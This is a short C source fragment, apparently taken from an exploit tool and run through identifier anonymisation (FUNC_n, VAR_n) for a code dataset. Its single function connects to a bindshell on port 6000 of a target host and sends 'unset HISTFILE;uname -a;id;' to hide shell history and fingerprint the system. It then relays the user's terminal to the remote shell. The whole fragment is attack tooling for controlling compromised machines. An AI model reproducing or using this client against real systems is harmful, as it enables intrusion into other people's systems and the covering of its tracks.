
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct sockaddr_in {int sin_port; int sin_addr; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {int h_length; scalar_t__ h_addr; } ;
typedef int fd_set ;
typedef int buffer ;
typedef int addr ;


 int VAR_0 ;
 scalar_t__ FUNC_0 (int,int *) ;
 int FUNC_1 (int,int *) ;
 int FUNC_2 (int *) ;
 int VAR_1 ;
 int VAR_2 ;
 int FUNC_3 (char*,char*,int ) ;
 int FUNC_4 (char*,int) ;
 scalar_t__ FUNC_5 (int,struct sockaddr*,int) ;
 int FUNC_6 (int) ;
 int FUNC_7 (int ,char*) ;
 struct hostent* FUNC_8 (char*) ;
 int FUNC_9 (int) ;
 int FUNC_10 (char*) ;
 int FUNC_11 (char*) ;
 int FUNC_12 (int ,char*,int) ;
 int FUNC_13 (int,char*,int,int ) ;
 scalar_t__ FUNC_14 (int,int *,int *,int *,int *) ;
 scalar_t__ FUNC_15 (int,char*,int,int ) ;
 int FUNC_16 (int ,int ,int ) ;
 int VAR_3 ;
 int FUNC_17 (char*) ;
 int FUNC_18 (int) ;
 scalar_t__ FUNC_19 (int,char*,int) ;

int FUNC_20(char *VAR_4)
{
fd_set VAR_5;
char VAR_6[2048];
char *VAR_7 = "unset HISTFILE;uname -a;id;\n";
int VAR_8, VAR_9 = 6000;
int VAR_10;
struct sockaddr_in VAR_11;
struct hostent *VAR_12;

VAR_12 = FUNC_8(VAR_4);

if((VAR_10 = FUNC_16(VAR_0, VAR_2, VAR_1)) <0){
FUNC_10("can't open socket\n");
FUNC_6(1);
}

FUNC_4((char *)&VAR_11, sizeof(VAR_11));
VAR_11.sin_family = VAR_0;
FUNC_3((char *)VAR_12->h_addr, (char *)&VAR_11.sin_addr, VAR_12->h_length);
VAR_11.sin_port = FUNC_9(VAR_9);

if(FUNC_5(VAR_10, (struct sockaddr *)&VAR_11, sizeof(VAR_11))<0){
FUNC_11("[-] Connect to bindshell failed\n");
return -1;
}

FUNC_2(&VAR_5);
FUNC_1(VAR_10, &VAR_5);
FUNC_1(0, &VAR_5);

FUNC_15(VAR_10, VAR_7, FUNC_17(VAR_7), 0);

while(1) {
FUNC_1(VAR_10, &VAR_5);
FUNC_1(0, &VAR_5);

if(FUNC_14(VAR_10+1, &VAR_5, ((void*)0), ((void*)0), ((void*)0))<0)
break;

if( FUNC_0(VAR_10, &VAR_5) ){
if((VAR_8 = FUNC_13(VAR_10, VAR_6, sizeof(VAR_6), 0))<0){
FUNC_7(VAR_3, "EOF\n");
FUNC_6(2);
}
if(FUNC_19(1,VAR_6, VAR_8)<0)
break;
}

if ( FUNC_0(0, &VAR_5) ) {
if((VAR_8 = FUNC_12(0,VAR_6, sizeof(VAR_6)))<0){
FUNC_7(VAR_3,"EOF\n");
FUNC_6(2);
}
if(FUNC_15(VAR_10, VAR_6, VAR_8, 0)<0)
break;
}

FUNC_18(10);

}
FUNC_7(VAR_3,"Connection lost.\n");
FUNC_6(0);
}
